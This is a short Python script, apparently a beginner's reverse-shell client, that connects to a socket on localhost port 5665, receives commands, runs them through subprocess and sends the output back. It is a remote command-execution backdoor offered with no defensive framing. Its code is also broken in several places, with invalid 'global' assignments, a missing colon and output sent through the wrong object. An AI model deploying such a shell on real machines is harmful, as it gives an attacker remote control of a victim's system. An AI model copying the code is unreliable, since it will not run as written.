# This code is to make a remote connection to the server
import os
import subprocess
import socket

def socketCreate():
  global sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  global host="127.0.0.1"
  global port=5665

def connectionEst():
  global sock
  global host
  global port
  sock.connect((host,port))
  while True:
    cmd=sock.recv(1024)
    if cmd[:2]=="cd"
      os.chdir(cmd[3:])
    else:
      sub=subprocess.Popen(cmd[:],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      cmd.send(sub.stdout.read()+sub.stderr.read())
      
def main():
  socketCreate()
  connectionEst()
main()  
